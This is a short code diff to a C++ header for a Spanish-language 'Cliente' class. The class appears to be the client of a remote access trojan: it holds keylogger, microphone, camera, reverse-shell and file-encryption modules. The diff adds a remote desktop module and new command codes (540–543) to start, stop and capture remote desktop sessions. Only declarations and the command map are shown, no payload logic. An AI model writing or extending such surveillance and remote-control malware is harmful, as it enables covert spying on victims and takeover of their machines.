@@ -5,6 +5,7 @@
 #include "mod_mic.hpp"
 #include "mod_keylogger.hpp"
 #include "mod_camara.hpp"
+#include "mod_remote_desktop.hpp"
 
 
 class ReverseShell;
@@ -26,6 +27,7 @@ class Cliente {
 		Mod_Mic* mod_Mic = nullptr;
 		mod_Keylogger* mod_Key = nullptr;
 		mod_Camera* mod_Cam = nullptr;
+		mod_RemoteDesktop* mod_RemoteDesk = nullptr;
 
 		//Para recibir archivo (single)
 		FILE *fpArchivo = nullptr;
@@ -67,7 +69,11 @@ class Cliente {
 			{"534", EnumComandos::CM_Single},
 			{"536", EnumComandos::CM_Live_Start},
 			{"537", EnumComandos::CM_Live_Stop},
-			{"538", EnumComandos::FM_Crypt_Confirm}
+			{"538", EnumComandos::FM_Crypt_Confirm},
+			{"540", EnumComandos::RD_Single},
+			{"541", EnumComandos::RD_Start},
+			{"542", EnumComandos::RD_Stop},
+			{"543", EnumComandos::RD_Salida}
 		};
 
 		Cliente();
